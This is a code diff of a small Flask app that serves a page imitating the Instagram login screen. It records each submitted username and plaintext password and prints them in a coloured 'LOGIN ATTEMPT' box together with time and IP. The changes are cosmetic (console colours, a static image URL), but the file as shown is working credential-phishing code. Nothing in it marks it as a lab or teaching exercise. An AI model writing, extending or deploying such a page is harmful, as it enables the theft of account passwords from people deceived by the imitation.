@@ -1,9 +1,12 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, url_for
 import datetime
+from colorama import init, Fore, Style
+
+init(autoreset=True)  # Initialize colorama
 
 app = Flask(__name__)
 
-# ---------- Original HTML ----------
+# ---------- Original HTML with static image URL ----------
 HTML_PAGE = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -21,143 +24,34 @@ body {
   align-items:center;
   height:100vh;
 }
-.container {
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  width:100%;
-  max-width:900px;
-  background-color:white;
-  border:1px solid #dbdbdb;
-  border-radius:8px;
-}
-.left {
-  padding:20px;
-  width:50%;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-}
-.left img {
-  max-width:100%;
-  height:auto;
-  border-radius:10px;
-}
-.right {
-  padding:40px;
-  width:50%;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-}
-.logo img {
-  width:175px;
-  margin-bottom:20px;
-}
-.form {
-  width:100%;
-  max-width:300px;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-}
-.input_field {
-  margin-bottom:10px;
-  width:100%;
-}
-.input_field input {
-  width:100%;
-  padding:10px;
-  border:1px solid #dbdbdb;
-  border-radius:3px;
-  background:#fafafa;
-}
-.btn button {
-  width:100%;
-  background-color:#3897f0;
-  color:white;
-  padding:10px;
-  border:none;
-  border-radius:3px;
-  font-weight:bold;
-  cursor:pointer;
-}
-.or {
-  display:flex;
-  align-items:center;
-  margin:10px 0;
-  width:100%;
-  max-width:300px;
-}
-.or .line {
-  flex:1;
-  height:1px;
-  background-color:#dbdbdb;
-}
-.or p {
-  margin:0 10px;
-  font-weight:bold;
-  color:#8e8e8e;
-}
-.dif {
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  width:100%;
-  margin-top:10px;
-}
-.dif .fb {
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  color:#385185;
-  font-weight:bold;
-  margin-bottom:8px;
-}
-.dif .fb img {
-  margin-right:5px;
-}
-.forgot a {
-  color:#00376b;
-  text-decoration:none;
-}
-.signup, .apps, .footer {
-  margin-top:20px;
-  text-align:center;
-  font-size:14px;
-  color:#8e8e8e;
-}
-.apps .icons img {
-  width:120px;
-  margin:5px;
-}
-.footer .links ul {
-  display:flex;
-  flex-wrap:wrap;
-  justify-content:center;
-  list-style:none;
-  padding:0;
-  margin:0;
-}
-.footer .links ul li {
-  margin:0 5px;
-}
-.footer .links ul li a {
-  color:#00376b;
-  text-decoration:none;
-  font-size:12px;
-}
-.copyright {
-  margin-top:10px;
-  font-size:12px;
-  color:#8e8e8e;
-}
+.container { display:flex; justify-content:center; align-items:center; width:100%; max-width:900px; background-color:white; border:1px solid #dbdbdb; border-radius:8px; }
+.left { padding:20px; width:50%; display:flex; justify-content:center; align-items:center; }
+.left img { max-width:100%; height:auto; border-radius:10px; }
+.right { padding:40px; width:50%; display:flex; flex-direction:column; align-items:center; }
+.logo img { width:175px; margin-bottom:20px; }
+.form { width:100%; max-width:300px; display:flex; flex-direction:column; align-items:center; }
+.input_field { margin-bottom:10px; width:100%; }
+.input_field input { width:100%; padding:10px; border:1px solid #dbdbdb; border-radius:3px; background:#fafafa; }
+.btn button { width:100%; background-color:#3897f0; color:white; padding:10px; border:none; border-radius:3px; font-weight:bold; cursor:pointer; }
+.or { display:flex; align-items:center; margin:10px 0; width:100%; max-width:300px; }
+.or .line { flex:1; height:1px; background-color:#dbdbdb; }
+.or p { margin:0 10px; font-weight:bold; color:#8e8e8e; }
+.dif { display:flex; flex-direction:column; align-items:center; width:100%; margin-top:10px; }
+.dif .fb { display:flex; align-items:center; justify-content:center; color:#385185; font-weight:bold; margin-bottom:8px; }
+.dif .fb img { margin-right:5px; }
+.forgot a { color:#00376b; text-decoration:none; }
+.signup, .apps, .footer { margin-top:20px; text-align:center; font-size:14px; color:#8e8e8e; }
+.apps .icons img { width:120px; margin:5px; }
+.footer .links ul { display:flex; flex-wrap:wrap; justify-content:center; list-style:none; padding:0; margin:0; }
+.footer .links ul li { margin:0 5px; }
+.footer .links ul li a { color:#00376b; text-decoration:none; font-size:12px; }
+.copyright { margin-top:10px; font-size:12px; color:#8e8e8e; }
 </style>
 </head>
 <body>
 <div class="container">
   <div class="left">
-    <img src="/static/Insta.png" alt="Instagram Mockup">
+    <img src="{{ url_for('static', filename='Insta.png') }}" alt="Instagram Mockup">
   </div>
   <div class="right">
     <div class="logo">
@@ -220,17 +114,17 @@ body {
 </body>
 </html>"""
 
-# ---------- Pretty console box ----------
+# ---------- Pretty colored console box ----------
 def pretty_box(username, password, ip="unknown"):
     now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     lines = [
-        f" LOGIN ATTEMPT ",
-        f" Time : {now}",
+        f"{Fore.YELLOW} LOGIN ATTEMPT ",
+        f"{Fore.CYAN} Time : {now}",
         f" IP   : {ip}",
-        f" User : {username}",
-        f" Pass : {password}"
+        f"{Fore.GREEN} User : {username}",
+        f"{Fore.RED} Pass : {password}{Style.RESET_ALL}"
     ]
-    width = max(len(line) for line in lines) + 4
+    width = max(len(Style.strip(line)) for line in lines) + 4
     top = "╔" + "═"*width + "╗"
     bottom = "╚" + "═"*width + "╝"
     middle = "\n".join(f"║ {line.ljust(width-2)} ║" for line in lines)
@@ -260,3 +154,4 @@ if __name__ == "__main__":
     import os
     os.environ.pop("FLASK_ENV", None)
     app.run(host="127.0.0.1", port=5001, debug=False, use_reloader=False)
+
